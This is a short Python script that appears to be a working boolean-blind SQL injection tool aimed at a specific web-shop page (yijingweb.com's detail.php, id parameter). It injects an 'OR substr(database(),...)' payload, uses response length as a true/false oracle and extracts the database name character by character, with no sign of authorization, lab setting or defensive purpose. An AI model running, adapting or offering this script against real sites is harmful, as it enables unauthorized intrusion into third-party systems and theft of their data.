#!/usr/bin/env python3
"""Boolean blind SQLi - extract database name char by char (yijingweb)
Oracle: size ~22793 (true) vs ~4374 (false)
"""
import urllib.request, urllib.parse, string

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
BASE = "http://yijingweb.com/webmall/detail.php"
CHARS = string.digits + string.ascii_lowercase + string.ascii_uppercase + "_-."

def fetch(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, len(r.read())
    except urllib.error.HTTPError as e:
        return e.code, len(e.read(5000))
    except Exception:
        return 0, 0

def is_true(payload):
    code, sz = fetch(BASE + "?id=686" + payload)
    return sz > 10000  # true responses ~22793, false ~4374

def get_char(pos):
    for c in CHARS:
        # id=686' OR (select substr(database(),POS,1)='C')-- 
        payload = "%27%20OR%20(select%20substr(database()," + str(pos) + ",1)='" + c + "')--%20"
        if is_true(payload):
            return c
    return "?"

dbname = ""
for i in range(1, 7):
    c = get_char(i)
    dbname += c
    print("pos %d: %s -> %s" % (i, c, dbname), flush=True)
print("DATABASE:", dbname)
